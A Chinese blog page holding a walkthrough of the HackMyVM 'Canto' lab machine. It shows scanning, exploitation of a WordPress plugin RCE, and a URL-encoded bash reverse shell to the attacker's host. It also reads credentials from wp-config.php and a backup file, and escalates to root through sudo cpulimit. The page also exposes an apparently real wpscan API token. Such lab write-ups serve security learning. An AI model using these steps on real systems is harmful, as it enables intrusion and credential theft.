<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog" data-next-head=""/><meta property="og:description" content="Sunset的个人博客" data-next-head=""/><meta property="og:url" content="https://sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="https://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="https://sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="/images/logo.png" data-next-head=""/><meta name="theme-color" content="#b91c1c" data-next-head=""/><title data-next-head="">重定向中...</title><link rel="preload" href="/_next/static/css/7e0c5cb940b3b26c.css" as="style"/><link rel="stylesheet" href="/_next/static/css/7e0c5cb940b3b26c.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-0d12d6e4400a07d7.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-11d6836cabe9ca8b.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-bbf4b7181ea93b2c.js" defer=""></script><script src="/_next/static/a3EsaGgH1228Kusv-S7Zk/_buildManifest.js" defer=""></script><script src="/_next/static/a3EsaGgH1228Kusv-S7Zk/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="min-h-screen bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="w-full bg-[#fafafa] dark:bg-[#1f2022]" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><h1 class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"HackMyVMCanto","contentHtml":"\u003ch1\u003eCanto.\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://hackmyvm.eu/machines/machine.php?vm=Canto\"\u003ehttps://hackmyvm.eu/machines/machine.php?vm=Canto\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cstrong\u003enotes：Enjoy it!! ;)\u003c/strong\u003e\u003c/p\u003e\n\u003ch2\u003e前期踩点\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Canto nmap -sP 192.168.56.0/24                 \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-15 22:50 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.1\nHost is up (0.00019s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.2\nHost is up (0.00012s latency).\nMAC Address: 08:00:27:05:4E:40 (Oracle VirtualBox virtual NIC)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.61\nHost is up (0.00022s latency).\nMAC Address: 08:00:27:80:95:AF (Oracle VirtualBox virtual NIC)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.4\nHost is up.\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 256 IP addresses (4 hosts up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 1.97 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Canto nmap -sT -min-rate 10000 -p- 192.168.56.61 \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-15 22:52 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.61\nHost is up (0.0012s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:80:95:AF (Oracle VirtualBox virtual NIC)\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 4.09 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Canto nmap -sT -A -T4 -O -p 22,80 192.168.56.61                    \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-15 22:54 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.61\nHost is up (0.0013s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.3p1 Ubuntu 1ubuntu3.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 c6:af:18:21:fa:3f:3c:\u003cspan class=\"hljs-built_in\"\u003efc\u003c/span\u003e:9f:e4:ef:04:c9:16:cb:c7 (ECDSA)\n|_  256 ba:0e:8f:0b:24:20:dc:75:b7:1b:04:a1:81:b6:6d:64 (ED25519)\n80/tcp open  http    Apache httpd 2.4.57 ((Ubuntu))\n|_http-generator: WordPress 6.5.3\n|_http-server-header: Apache/2.4.57 (Ubuntu)\n|_http-title: Canto\nMAC Address: 08:00:27:80:95:AF (Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.8\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   1.31 ms 192.168.56.61\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eWeb 渗透\u003c/h2\u003e\n\u003ch3\u003e信息收集\u003c/h3\u003e\n\u003cp\u003e访问主页，使用 \u003ccode\u003eWordPress\u003c/code\u003e 构建的\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMCanto/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e使用 \u003ccode\u003ewpscan\u003c/code\u003e 进行针对性扫描\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Canto wpscan --url 192.168.56.61 --api-token bOauzGNYvhy6BU3DlHGCMVZmWJDqZH5tuFoHfsdk91o -e u,ap --plugins-detection mixed\n_______________________________________________________________\n         __          _______   _____\n         \\ \\        / /  __ \\ / ____|\n          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ ®\n           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e_ \\\n            \\  /\\  /  | |     ____) | (__| (_| | | | |\n             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|\n\n         WordPress Security Scanner by the WPScan Team\n                         Version 3.8.27\n       Sponsored by Automattic - https://automattic.com/\n       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart\n_______________________________________________________________\n\n[+] URL: http://192.168.56.61/ [192.168.56.61]\n[+] Started: Thu May 15 22:56:42 2025\n.....\n[+] WordPress version 6.5.3 identified (Insecure, released on 2024-05-07).\n | Found By: Rss Generator (Passive Detection)\n |  - http://192.168.56.61/index.php/feed/, \u0026#x3C;generator\u003ehttps://wordpress.org/?v=6.5.3\u0026#x3C;/generator\u003e\n |  - http://192.168.56.61/index.php/comments/feed/, \u0026#x3C;generator\u003ehttps://wordpress.org/?v=6.5.3\u0026#x3C;/generator\u003e\n |\n | [!] 3 vulnerabilities identified:\n |\n | [!] Title: WordPress \u0026#x3C; 6.5.5 - Contributor+ Stored XSS \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e HTML API\n |     Fixed \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e: 6.5.5\n |     References:\n |      - https://wpscan.com/vulnerability/2c63f136-4c1f-4093-9a8c-5e51f19eae28\n |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/\n |\n | [!] Title: WordPress \u0026#x3C; 6.5.5 - Contributor+ Stored XSS \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e Template-Part Block\n |     Fixed \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e: 6.5.5\n |     References:\n |      - https://wpscan.com/vulnerability/7c448f6d-4531-4757-bff0-be9e3220bbbb\n |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/\n |\n | [!] Title: WordPress \u0026#x3C; 6.5.5 - Contributor+ Path Traversal \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e Template-Part Block\n |     Fixed \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e: 6.5.5\n |     References:\n |      - https://wpscan.com/vulnerability/36232787-754a-4234-83d6-6ded5e80251c\n |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/\n\n [+] WordPress theme \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e use: twentytwentyfour\n | Location: http://192.168.56.61/wp-content/themes/twentytwentyfour/\n | Last Updated: 2024-11-13T00:00:00.000Z\n | Readme: http://192.168.56.61/wp-content/themes/twentytwentyfour/readme.txt\n | [!] The version is out of \u003cspan class=\"hljs-built_in\"\u003edate\u003c/span\u003e, the latest version is 1.3\n | [!] Directory listing is enabled\n | Style URL: http://192.168.56.61/wp-content/themes/twentytwentyfour/style.css\n | Style Name: Twenty Twenty-Four\n | Style URI: https://wordpress.org/themes/twentytwentyfour/\n | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...\n | Author: the WordPress team\n | Author URI: https://wordpress.org\n |\n | Found By: Urls In Homepage (Passive Detection)\n |\n | Version: 1.1 (80% confidence)\n | Found By: Style (Passive Detection)\n ....\n [+] Enumerating All Plugins (via Passive and Aggressive Methods)    \n [+] canto\n | Location: http://192.168.56.61/wp-content/plugins/canto/\n | Last Updated: 2025-04-10T07:17:00.000Z\n | Readme: http://192.168.56.61/wp-content/plugins/canto/readme.txt\n | [!] The version is out of \u003cspan class=\"hljs-built_in\"\u003edate\u003c/span\u003e, the latest version is 3.1.0\n |\n | Found By: Known Locations (Aggressive Detection)\n |  - http://192.168.56.61/wp-content/plugins/canto/, status: 200\n |\n | [!] 4 vulnerabilities identified:\n |\n | [!] Title: Canto \u0026#x3C; 3.0.9 - Unauthenticated Blind SSRF\n |     Fixed \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e: 3.0.9\n |     References:\n |      - https://wpscan.com/vulnerability/29c89cc9-ad9f-4086-a762-8896eba031c6\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28976\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28977\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28978\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-24063\n |      - https://gist.github.com/p4nk4jv/87aebd999ce4b28063943480e95fd9e0\n |\n | [!] Title: Canto \u0026#x3C; 3.0.5 - Unauthenticated Remote File Inclusion\n |     Fixed \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e: 3.0.5\n |     References:\n |      - https://wpscan.com/vulnerability/9e2817c7-d4aa-4ed9-a3d7-18f3117ed810\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-3452\n |\n | [!] Title: Canto \u0026#x3C; 3.0.7 - Unauthenticated RCE\n |     Fixed \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e: 3.0.7\n |     References:\n |      - https://wpscan.com/vulnerability/1595af73-6f97-4bc9-9cb2-14a55daaa2d4\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-25096\n |      - https://patchstack.com/database/vulnerability/canto/wordpress-canto-plugin-3-0-6-unauthenticated-remote-code-execution-rce-vulnerability\n |\n | [!] Title: Canto \u0026#x3C; 3.0.9 - Unauthenticated Remote File Inclusion\n |     Fixed \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e: 3.0.9\n |     References:\n |      - https://wpscan.com/vulnerability/3ea53721-bdf6-4203-b6bc-2565d6283159\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-4936\n | [!] Title: Canto \u0026#x3C; 3.0.9 - Unauthenticated Remote File Inclusion\n |     Fixed \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e: 3.0.9\n |     References:\n |      - https://wpscan.com/vulnerability/3ea53721-bdf6-4203-b6bc-2565d6283159\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-4936\n |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/95a68ae0-36da-499b-a09d-4c91db8aa338 \n |\n | Version: 3.0.4 (100% confidence)\n | Found By: Readme - Stable Tag (Aggressive Detection)\n |  - http://192.168.56.61/wp-content/plugins/canto/readme.txt\n | Confirmed By: Composer File (Aggressive Detection)\n |  - http://192.168.56.61/wp-content/plugins/canto/package.json, Match: \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e3.0.4\u003cspan class=\"hljs-string\"\u003e'\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e扫描出好几个漏洞，其中插件 \u003ccode\u003eCanto\u003c/code\u003e 存在 \u003ccode\u003eRCE\u003c/code\u003e 漏洞\u003c/p\u003e\n\u003ch3\u003eCanto RCE - CVE-2023-3452\u003c/h3\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/leoanggal1/CVE-2023-3452-PoC\"\u003ehttps://github.com/leoanggal1/CVE-2023-3452-PoC\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMCanto/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e进行反弹 \u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e%2Fbin%2Fbash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.56.4%2F1234+0%3E%261%27\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMCanto/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e提权 - To Erik\u003c/h2\u003e\n\u003ch3\u003e信息收集\u003c/h3\u003e\n\u003cp\u003e查看配置文件 \u003ccode\u003ewp-config.php\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e/** The name of the database \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e WordPress */\ndefine( \u003cspan class=\"hljs-string\"\u003e'DB_NAME'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'wordpress'\u003c/span\u003e ); \n/** Database username */\ndefine( \u003cspan class=\"hljs-string\"\u003e'DB_USER'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'wordpress'\u003c/span\u003e );\n                                                    \n/** Database password */           \ndefine( \u003cspan class=\"hljs-string\"\u003e'DB_PASSWORD'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'2NCVjoWVE9iwxPz'\u003c/span\u003e );\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003emysql\u003c/code\u003e 数据收集\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@canto:/var/www/html$ mysql -uwordpress -p\nEnter password: \nWelcome to the MySQL monitor.  Commands end with ; or \\g.\nYour MySQL connection \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e is 69\nServer version: 8.0.36-0ubuntu0.23.10.1 (Ubuntu)\n\nCopyright (c) 2000, 2024, Oracle and/or its affiliates.\n\nOracle is a registered trademark of Oracle Corporation and/or its\naffiliates. Other names may be trademarks of their respective\nowners.\n\nType \u003cspan class=\"hljs-string\"\u003e'help;'\u003c/span\u003e or \u003cspan class=\"hljs-string\"\u003e'\\h'\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e. Type \u003cspan class=\"hljs-string\"\u003e'\\c'\u003c/span\u003e to clear the current input statement.\n\nmysql\u003e \n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003emysql\u003e \u003cspan class=\"hljs-keyword\"\u003eselect\u003c/span\u003e * from wp_users;\n+----+------------+------------------------------------+---------------+----------------+---------------------+---------------------+---------------------+-------------+--------------+\n| ID | user_login | user_pass                          | user_nicename | user_email     | user_url            | user_registered     | user_activation_key | user_status | display_name |\n+----+------------+------------------------------------+---------------+----------------+---------------------+---------------------+---------------------+-------------+--------------+\n|  1 | erik       | $P\u003cspan class=\"hljs-variable\"\u003e$BZk2jE4XrC91HKgRS83h0gICjM0bcB\u003c/span\u003e. | erik          | \u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e@gmail.com | http://192.168.1.36 | 2024-05-12 11:16:07 |                     |           0 | erik         |\n+----+------------+------------------------------------+---------------+----------------+---------------------+---------------------+---------------------+-------------+--------------+\n1 row \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e (0.00 sec)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用 \u003ccode\u003eJohn\u003c/code\u003e 进行爆破无果\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003e在erik用户家目录能找到\u003c/code\u003e \u003ccode\u003enotes\u003c/code\u003e 文件夹\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@canto:/home/erik/notes$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e -al\ntotal 16\ndrwxrwxr-x 2 erik erik     4096 May 12  2024 .\ndrwxr-xr-- 5 erik www-data 4096 May 12  2024 ..\n-rw-rw-r-- 1 erik erik       68 May 12  2024 Day1.txt\n-rw-rw-r-- 1 erik erik       71 May 12  2024 Day2.txt\nwww-data@canto:/home/erik/notes$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e Day\n\u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e: Day: No such file or directory\nwww-data@canto:/home/erik/notes$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e Day1.txt \nOn the first day I have updated some plugins and the website theme.\nwww-data@canto:/home/erik/notes$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e Day2.txt \nI almost lost the database with my user so I created a backups folder.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e寻找 \u003ccode\u003ebackups\u003c/code\u003e 文件夹\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@canto:/home/erik$ find / -name backups 2\u003e/dev/null\n/snap/core22/1380/var/backups\n/snap/core22/864/var/backups\n/var/backups\n/var/wordpress/backups\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003e下面存在一个txt文件，里面是\u003c/code\u003e \u003ccode\u003eerik\u003c/code\u003e 用户的密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@canto:/var/wordpress/backups$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e 12052024.txt \n------------------------------------\n| Users     |      Password        |\n------------|----------------------|\n| erik      | th1sIsTheP3ssw0rd!   |\n------------------------------------\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eerik@canto:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e user.txt \nd41d8cd98f00b204e9800998ecf8427e\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e提权 - To Root\u003c/h2\u003e\n\u003cp\u003e查看 \u003ccode\u003esudo\u003c/code\u003e 权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eerik@canto:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e erik on canto:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,\n    use_pty\n\nUser erik may run the following commands on canto:\n    (ALL : ALL) NOPASSWD: /usr/bin/cpulimit\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ca href=\"https://gtfobins.github.io/gtfobins/cpulimit/\"\u003ehttps://gtfobins.github.io/gtfobins/cpulimit/\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMCanto/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eerik@canto:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e cpulimit -l 100 -f /bin/sh\nProcess 1300 detected\n\u003cspan class=\"hljs-comment\"\u003e# id\u003c/span\u003e\nuid=0(root) gid=0(root) \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e=0(root)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-comment\"\u003e# cat root.txt\u003c/span\u003e\n1b56eefaab2c896e57c874a635b24b49\n\u003c/code\u003e\u003c/pre\u003e","title":"HackMyVM - Canto","date":"2025-05-16","updated":"2025-05-16","tags":["HackMyVM","Linux靶机","WordPress"],"categories":"靶机","comments":true,"description":"Canto.\n\n https://hackmyvm.eu/machines/machine.php?vm=Canto\n \n\nnotes：Enjoy it!! ;)\n\n前期踩点\n\n\n\n\n\n\n\nWeb 渗透\n\n信息收集\n\n访问主页，使用 `WordPress` 构建的\n\n\n\n使用 `wpscan` 进行针对性扫描\n\n\n\n扫描出好几个漏洞，其中插件 `Canto` 存在 `RCE` 漏洞\n\nCanto ..."}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"HackMyVMCanto"},"buildId":"a3EsaGgH1228Kusv-S7Zk","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>